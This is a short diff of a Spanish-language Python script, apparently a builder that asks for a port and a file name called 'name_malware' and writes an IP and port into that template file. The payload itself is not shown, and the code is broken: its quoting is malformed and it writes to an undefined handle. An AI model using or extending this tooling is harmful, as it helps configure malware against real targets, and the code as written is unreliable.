@@ -12,10 +12,15 @@ Introduzca un puerto
 
 >  """)
 
-with open(""+ name_malware +", "rt"")as f:
+name_malware = input("""
+
+Introduzca el un nombre
+
+>  """)
+with open(""+ name_malware +".py", "rt"")as f:
   x = f.read()
   
-with open(""+ name_malware +", "wt"")as f:
+with open(""+ name_malware +".py", "wt"")as f:
   x = x.replace("ip", ""+ ip +"")
   x = x.replace("puerto", ""+ puerto +"")
   fin.write(x)
